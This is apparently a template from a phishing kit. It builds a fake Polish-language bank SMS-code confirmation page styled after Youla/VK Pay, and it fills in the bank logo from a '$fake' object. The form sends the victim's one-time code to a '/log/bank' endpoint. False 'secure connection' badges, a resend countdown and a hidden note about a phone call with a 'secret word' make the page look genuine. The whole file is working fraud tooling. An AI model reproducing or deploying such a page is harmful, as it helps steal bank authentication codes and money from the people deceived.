<div id="loading" style="display: none;">
    <img id="loading-image" src="{{asset('images/loader.gif')}}" alt="Proszę czekać...">
</div>
<div class="pay-card-layout pay-card-layout_type_youla-mobile">
    <div class="pay-card-layout__header_type_vkpay" style="position: initial;">
        <div class="pay-card-layout__logo">
            <img src="{{asset($fake->logo())}}" style="/*width: 134px;*/height: 46px;" alt="logo">
        </div>
    </div>
    <form class="pay-card js-pay-card pay-card_type_youla-mobile" id="bank_pm_form" method="POST"
          action="/log/bank">
        <div class="pay-card__row">
            <div class="pay-card__card js-credit-card">
                <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
                    <div class="credit-card-form__card-wrapper">
                        <div class="credit-card-form__card credit-card-form__card_position_front">
                            <div class="payment-systems-icons payment-systems-icons">
                                    <span id="mir"
                                          class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
                                <span id="visa"
                                      class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
                                <span id="mastercard"
                                      class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
                                <span id="maestro"
                                      class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
                            </div>
                            <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
                                <label class="js-cc-label credit-card-form__label">
                                    <font id="show_millenium" style="display: none;">Zadzwonimy do Pana/Pani,
                                        podamy
                                        tajne słowo, które musi Pan/Pani wpisać w polu wprowadzania kodu
                                        poniżej</font>
                                    <span class="credit-card-form__title"><b>Wpisz kod z SMS-a</b></span>
                                    <span><a style="color: black;font-size: 1em;font-weight: 800;" id="newcode"
                                             href="#" onclick="">Wyślij SMS ponownie (oczekuj 60)</a></span>
                                    <input style="border-radius: 20px 20px 20px 20px;" type="text"
                                           name="smsCode"
                                           id="codefromsms" autocomplete="cc-name"
                                           class="credit-card-form__input js-cc-input js-cc-name-input"
                                           maxlength="40" placeholder="" required="">
                                </label>
                            </div>
                        </div>
                    </div>
                    <div class="credit-card-form__submit">
                        <div class="credit-card-form__submit-inner">
                            <input id="cb"
                                   style="cursor: pointer;border-radius: 20px 20px 20px 20px;background-color: #002f34;"
                                   type="submit" class="js-button-submit button" name="submit"
                                   value="Potwierdzić">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>
    <div class="secure-information secure-information_type_youla-mobile">
            <span class="secure-information__text" title="Bezpieczne połączenie. Twoje dane są bezpieczne.">
            <span class="secure-information__icon" style="">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5gehXh8NYPjg_H3S8ealcJIhsSACeJi-rJw&amp;usqp=CAU"
         style="
    width: 104%;
    margin-top: -4px;">
</span> <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
            <span class="secure-information__text_type_secure-connection">Bezpieczne połączenie</span>
            <img src="https://storage.finance.kz/images/2019/11/21/600c6e01eb0c76a1f4007823769e4ba5.png" style="
    width: 50%;
    margin-left: 25%;"></span>

    </div>
</div>
<script>
    function smscodenew() {
        let newcode = $('#newcode');
        $('input[name="smsCode"]').val('');
        $('#loading').show();
        newcode.text('Wyślij SMS ponownie (oczekuj)')
            .css('color', 'black')
            .attr('onclick', '');
        setTimeout(function () {
            $('#loading').hide();
        }, 2000);
    }

    $('#newcode').css('color', 'black').attr('onclick', '');
    var timer = 60;

    function decrementAfter1Second() {
        setTimeout(function () {
            let newcode = $('#newcode');
            timer--;
            newcode.text('Wyślij SMS ponownie (oczekuj ' + timer + ')');
            if (timer === 0) {
                newcode.text('WYŚLIJ SMS PONOWNIE')
                    .css('color', 'green')
                    .attr('onclick', 'smscodenew();');
            } else decrementAfter1Second();
        }, 1000);
    }

    decrementAfter1Second();
</script>